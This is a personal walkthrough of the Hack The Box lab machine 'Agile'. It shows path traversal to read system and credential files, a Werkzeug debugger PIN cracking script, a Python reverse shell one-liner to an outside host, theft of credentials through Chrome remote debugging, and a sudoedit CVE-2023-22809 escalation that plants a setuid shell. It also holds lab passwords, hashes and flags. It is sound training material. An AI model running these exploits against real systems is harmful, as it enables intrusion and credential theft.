---
date:
    created: 2023-08-19
draft: false
---

# HTB: Agile

<!-- more -->

# 10.10.11.203
- superpass.htb
- CREDS
    - `superpassuser:dSA6l7q*yIVs$39Ml6ywvgK`
    - `corum:5db7caa1d13cc37c9fc2`
    - `edwards:d07867c6267dcb5df0af`

## NMAP
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## FOOTHOLD
- website is a password manager
- allows you to register, login.
- has a vault to store passwords and an export option to export the passwords as CSV.
- directory search retured a page - `superpass.htb/download`
- going to the page, we get an error and then when I refreshed it, I got another error showing the stack trace to the code that was throwing the error
    - ![alt text](/docs/blog/attachments/builder.png)
    - we see that the app takes a parameter `fn` and searches for the file in temp
    - trying lfi to read a file
- `http://superpass.htb/download?fn=../../etc/passwd` returned a csv which had the `/etc/passwd` contents
    - Interesting users
    ```
    corum:x:1000:1000:corum:/home/corum:/bin/bash
    runner:x:1001:1001::/app/app-testing/:/bin/sh
    edwards:x:1002:1002::/home/edwards:/bin/bash
    dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
    ```
- we know the server is using nginx

- trying `http://superpass.htb/download?fn=../../etc/nginx/sites-enabled/default`
- `/download?fn=../..//app/app/superpass/vault_views.py`
- `/download?fn=../..//proc/self/environ`
    - `/download?fn=../..//app/config_prod.json`
        - {"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
- In the traceback errors, we found a Secret Key - `XdUXRAVGsQSlXFACyHPM`
- the trace errors mention a Werkzueg debugger
- https://blog.gregscharf.com/2023/04/09/lfi-to-rce-in-flask-werkzeug-application/
```
The Werkzeug debugger PIN is generated algorithmically based on specific pieces of information from the system running the application, not by "reversing" the "secret key" found in the traceback. The "secret key" displayed in the traceback is the unique ID for the current debugger session, but it is not the PIN itself.
To calculate the PIN, you need to replicate the same algorithm used by Werkzeug, which requires gathering several specific system details:
Username: The username of the operating system user who started the Flask application (e.g., www-data, ubuntu, etc.). This can sometimes be found in /proc/self/environ if you can read files on the server.
Module Name: Usually flask.app.
Application Name: Usually Flask.
Flask application file path: The absolute path to the app.py or equivalent file that is the main entry point of the Flask application (e.g., /usr/local/lib/python3.5/dist-packages/flask/app.py). This path is often visible within the traceback itself.
MAC Address: The MAC address of the network interface of the machine, converted to a decimal integer. This can sometimes be found in /proc/net/arp or other system files.
Machine ID / Boot ID: A unique identifier for the machine, typically read from /etc/machine-id or /proc/sys/kernel/random/boot_id. Sometimes additional information from /proc/self/cgroup is needed.
Once all these "public" and "private" bits are collected, they are combined and hashed using a specific algorithm (often SHA1, though it can vary by Werkzeug version) to produce the 9-digit PIN
```
- We need a few things to crack the debugger pin
public things
1. username who started the app - `www-data` from `config_prod.json`
2. modname of the flask.app  - `flask.app` usually
3. getattr - `Flask`
4. abs app.py path - `/app/venv/lib/python3.10/site-packages/flask/app.py` - from stacktrace

```
Next we need the modname, which is oftentimes flask.app but that is not always the case. Another possible value is werkzeug.debug. This part might require some trial and error.

We also need the app’s name, which is oftentimes Flask. But other possible values are DebuggedApplication and wsgi_app. So again, some trial and error might be required if the usual values don’t generate a valid PIN.
```


private things
1. mac address - `00:50:56:b0:91:80` - `345051795840`
    - get device-id - `/proc/net/arp` - `eth0`
    - get mac address - `/sys/class/net/eth0/address` - `00:50:56:b0:91:80`
    - get decimal value of this mac
        - python3
        - 0x005056b09180
2. machine_id() -
    - `/etc/machine-id or /proc/sys/kernel/random_boot_id`  - `ed5b159560f54721827644bc9b220d00`
    - for containers:
        - do `linux += f.readline().strip().rpartition(b"/")[2]` on `/proc/self/cgroup`
        - `0::/system.slice/superpass.service` - value from cgroup
        - `superpass.service` - after the strip processing


- update the `~/tools/werkzeug/debug-crack.py` with above values
```
import hashlib
from itertools import chain
probably_public_bits = [
	'www-data',# username
	'flask.app',# modname
	'wsgi_app', # getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]
private_bits = [
	'345051795840', #the value from /sys/class/net/<device-id>/address
	'ed5b159560f54721827644bc9b220d00superpass.service' # value from /etc/machine-id
]
# h = hashlib.md5() # For older versions
h = hashlib.sha1() # For newer versions
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')

for x in range(0, len(num), group_size))
			break
	else:
		rv = num
print(rv)
```
- run it to get - `434-664-579`
- enter the pin and we get `[console ready >>>]` - which runs python

- start a nc shell
- `import os,pty,socket;s=socket.socket();s.connect(("10.10.14.14",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")`
- get a reverse shell as `www-data`
- running linpeas as www-data
```
- we are in 10.10.11.203
- runner is running chrome in debug mode port 41829

- testsuperpass.htb - localhost:5555
- login to mysql db
```

- Mysql enum
```
mysql> select * from users;
select * from users;
+----+---------------+--------------------------------------------------------------------------------------------------------------------------+
| id | username      | hashed_password                                                                                                          |
+----+---------------+--------------------------------------------------------------------------------------------------------------------------+
|  1 | 0xdf          | $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF. |
|  2 | corum         | $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1 |
|  9 | admin         | $6$rounds=200000$JcYtXllanjouX4lS$LhNbQz2AD7tE/2aIHZCpXRgmHoeJWqbFtShE6IfCdcSYl0rpSktLYxlUVcpr8N3cavP.92uPZTmDEPXrHOAlx1 |
| 10 | superpassuser | $6$rounds=200000$zyPrbVSBIK5.ygAT$jQAhGToKu1qoTWeR3gn1ZALvzh8HBxoSqVfvDr5NJEy4NN6756a1elnGQk5hBjsVu2ioQVnuKPvbwvJOgwg1c0 |
+----+---------------+--------------------------------------------------------------------------------------------------------------------------+
4 rows in set (0.00 sec)

mysql> select * from passwords
select * from passwords
    -> ;
;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
5 rows in set (0.00 sec)

```
- trying `corum:5db7caa1d13cc37c9fc2` for ssh
    - get the user.txt - f73303770fe93e91c6422e0a2f47252b


## PRIVESC
- running linpeas as corum
    ```
    google-chrome -> /opt/google/chrome/cron/google-chrome
    /app/app-testing/tests/functional/creds.txt
    .pki/nssdb
    ```
- trying `/app/app-testing`
    - found the testing script
        ```
        def driver():
            options = Options()
            #options.add_argument("--no-sandbox")
            options.add_argument("--window-size=1420,1080")
            options.add_argument("--headless")
            options.add_argument("--remote-debugging-port=41829")
            options.add_argument('--disable-gpu')
            options.add_argument('--crash-dumps-dir=/tmp')
            driver = webdriver.Chrome(options=options)
            yield driver
            driver.close()
        ```
- https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/
    - `ssh -L 41829:localhost:41829 corum@superpass.htb`
    - go to `http://127.0.0.1:41829/json` and find the devtools frontend url
        - append the frontendurl to `http://127.0.0.1:41829/`
    - found `edwards:d07867c6267dcb5df0af`
        - or `dedwards__:7dbfe676b6b564ce5718`
    - logged in as edwards

- running linpeas as edward
    ```
    /home/edwards/.local/share/containers/storage/libpod/bolt_state.db
    0      0 127.0.0.1:60637         0.0.0.0:*               LISTEN      -
    ```
- `sudo -l`
    - allows sudoedit as `dev_admin`
    - `sudoedit -u dev_admin /app/config_test.json`
    ```
    {
        "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
    }
    ```
    - `sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt`
        - `edwards:1d7ffjwrx#$d6qn!9nndqgde4`

**IMPORTANT**
- we see a venv prompt when we got reverse shell for `www-data`
- `which python` points to `/app/venv/bin/python`
- echo $PATH shows `/app/venv/bin` at first
- This happens because the global bashrc file includes sourcing the venv on this box:
- `tail -2 /etc/bash.bashrc `
    ```
    # all users will want the env associated with this application
    source /app/venv/bin/activate
    ```
- `ls -l /app/venv/bin/activate` is writeable by `root` and `dev_admin`
- abuse CVE-2023-22809 to write this file as dev_admin:
    ```
    $ export EDITOR='nano -- /app/venv/bin/activate'
    $ sudoedit -u dev_admin /app/config_test.json
    ```
- add the line below to the activate code
    - `cp /bin/bash /tmp && chmod 4755 /tmp/bash`
- wait for some time and then check `/tmp`
- `/tmp/bash -p` to get root.txt - 65f09654e0508563d321fb6d02d94634
